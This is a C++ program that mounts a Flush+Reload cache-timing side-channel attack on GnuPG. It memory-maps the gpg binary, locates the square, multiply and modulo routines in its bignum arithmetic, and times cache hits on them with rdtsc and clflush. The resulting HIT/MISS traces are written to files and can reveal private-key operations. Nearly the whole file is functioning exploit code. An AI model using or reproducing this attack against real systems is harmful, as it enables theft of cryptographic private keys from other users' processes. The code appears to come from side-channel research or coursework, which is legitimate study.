#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdint.h>
#include <vector>
using namespace std;

#include "constants.h"
#include "symbol_resolver.h"

inline int probe(char *adrs) {
    volatile unsigned long time;
    asm __volatile__ (
        "   mfence \n "
        "   lfence \n "
        "   rdtsc \n "
        "   lfence \n "
        "   movl %%eax, %%esi \n "
        "   movl (%1), %%eax \n "
        "   lfence \n "
        "   rdtsc \n "
        "   subl %%esi, %%eax \n "
        "   clflush 0(%1) \n "
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");
    return time;
}

inline unsigned long gettime() {
  volatile unsigned long tl;
  asm __volatile__("lfence\nrdtsc" : "=a" (tl): : "%edx");
  return tl;
}

inline void flush(char *adrs) {
  asm __volatile__ ("mfence\nclflush 0(%0)" : : "r" (adrs) :);
}

int main() {
    const char *filepath = "/usr/local/bin/gpg";
    
    ProbeAddresses addrs;
    if (!resolve_symbols(filepath, addrs)) {
        printf("\n");
        use_fallback_addresses(addrs);
    }
    
    int fd = open(filepath, O_RDONLY);
    if (fd < 0) {
        printf("Error opening file\n");
        return 1;
    }

    struct stat st;
    fstat(fd, &st);

    char *gpg = (char *) mmap(NULL, st.st_size, PROT_READ, MAP_SHARED, fd, 0);
    if (gpg == MAP_FAILED) {
        printf("mmap failed\n");
        close(fd);
        return 1;
    }

    char *modulo = (char *)(((uintptr_t)(gpg + addrs.div + 0x234)) & ~0x3fUL);  // divq instruction in loop
    char *mul = (char *)(((uintptr_t)(gpg + addrs.mul + 0x60)) & ~0x3fUL);      // addmul in mul_n
    char *sqr = (char *)(((uintptr_t)(gpg + addrs.sqr + 0x133)) & ~0x3fUL);     // call to sqr_n_basecase
    
    // flush(sqr);
    // flush(modulo);
    // flush(mul);
    
    // bool triggered = false;
    
    // while (!triggered) {
    //     int sqr_time = probe(sqr);
    //     int mul_time = probe(mul);
    //     int mod_time = probe(modulo);
        
    //     if (sqr_time < THRESHOLD || mul_time < THRESHOLD || mod_time < THRESHOLD) {
            
    //         triggered = true;
    //         break;
    //     }
        

    // }
    
    int timeslot = 0;
    vector<pair<int, int>> modulo_probe_times;
    vector<pair<int, int>> mul_probe_times;
    vector<pair<int, int>> sqr_probe_times;

    flush(sqr);
    flush(modulo);
    flush(mul);

    unsigned long slotstart = gettime();
    unsigned long slotsize = BUSY;
    unsigned long current;

    while(timeslot < MAX_PROBES) {
        sqr_probe_times.push_back({timeslot, probe(sqr)});
        modulo_probe_times.push_back({timeslot, probe(modulo)});
        mul_probe_times.push_back({timeslot, probe(mul)});

        timeslot++;

        do {
            current = gettime();
        } while (current - slotstart < slotsize);
        
        slotstart += slotsize;
        
        while (current - slotstart > slotsize) {
            slotstart += slotsize;
        }
    }
    
    
    FILE* output = fopen("outputs/outputs.txt", "w");
    FILE* hits = fopen("outputs/hits.txt", "w");


    fprintf(output, "slot \t sqr \t mod \t mul\n"); 

    // write the three data as a single file for easier analysis
    for (int i = 0; i < MAX_PROBES; i++) {
        fprintf(output, "%d \t %d \t %d \t %d\n", i, sqr_probe_times[i].second, modulo_probe_times[i].second, mul_probe_times[i].second);
        fprintf(hits, "%d \t %s \t %s \t %s\n", i, 
            sqr_probe_times[i].second < THRESHOLD ? "HIT" : "MISS", 
            modulo_probe_times[i].second < THRESHOLD ? "HIT" : "MISS", 
            mul_probe_times[i].second < THRESHOLD ? "HIT" : "MISS");
    }

    fclose(output);
    fclose(hits);

    // FILE* modulo_output = fopen("outputs/modulo_output.txt", "w");
    // FILE* mul_output = fopen("outputs/mul_output.txt", "w");
    // FILE* sqr_output = fopen("outputs/sqr_output.txt", "w");

    // for (auto p : modulo_probe_times) {
    //     fprintf(modulo_output, "%d,mod,%d,%s\n", p.first, p.second, p.second < THRESHOLD ? "HIT" : "miss");
    // }

    // for (auto p : mul_probe_times) {
    //     fprintf(mul_output, "%d,mul,%d,%s\n", p.first, p.second, p.second < THRESHOLD ? "HIT" : "miss");
    // }

    // for (auto p : sqr_probe_times) {
    //     fprintf(sqr_output, "%d,sqr,%d,%s\n", p.first, p.second, p.second < THRESHOLD ? "HIT" : "miss");
    // }

    // fclose(modulo_output);
    // fclose(mul_output);
    // fclose(sqr_output);
    
    munmap(gpg, st.st_size);
    close(fd);
    
    return 0;
}
